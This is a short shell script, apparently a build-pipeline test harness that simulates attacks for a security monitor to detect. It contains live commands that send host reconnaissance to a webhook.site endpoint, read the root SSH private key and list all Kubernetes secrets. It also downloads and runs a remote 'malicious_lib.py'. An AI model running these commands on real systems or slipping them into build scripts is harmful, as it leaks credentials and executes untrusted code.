#!/bin/sh

echo "--- Starting build simulation ---"

# --- Test Case 1: Simple Reconnaissance ---
echo "\n[Test] Simulating data collection and exfiltration..."
echo "--------Recon Data -----------" > recon.txt
echo "User is: $(whoami)" >> recon.txt
echo "Hostname is: $(hostname)" >> recon.txt
echo "System: $(uname -a)" >> recon.txt
echo "-------------------------------" >> recon.txt

echo "Exfiltrating recon data"
curl -X POST --data-binary "@recon.txt" https://webhook.site/4ff37353-6f0b-4819-8c8a-f4e03355ca6a

# --- Test Case 2: Suspicious Inline Execution ---
echo "\n[Test] Running Python with an inline command that imports 'os'..."
python3 -c "import os; print(os.getcwd())"

# --- Test Case 3: Attempted Credential Access ---
echo "\n[Test] Attempting to read a sensitive file..."
cat /root/.ssh/id_rsa

# --- Test Case 4: Attempted Kubernetes Secret Listing ---
echo "\n[Test] Attempting to list Kubernetes secrets..."
kubectl get secret --all-namespaces

# --- Test Case 5: CRITICAL - Remote Code Execution ---
echo "\n[Test] Simulating a 'curl | bash' attack..."
curl -s https://example.com | cat

# --- Test Case 6: Supply Chain Attack Simulation ---
echo "\n[TEST] Simulating Supply Chain Attack from GitHub..."
MALICIOUS_LIB_URL="https://raw.githubusercontent.com/appsec-jedi/malicious-library/refs/heads/main/malicious_lib.py"
echo "Downloading library from $MALICIOUS_LIB_URL ..."
curl -sL $MALICIOUS_LIB_URL -o /tmp/malicious_lib.py
echo "Executing downloaded library..."
python3 /tmp/malicious_lib.py
echo "Supply chain test done"

echo "\n--- Build simulation finished ---"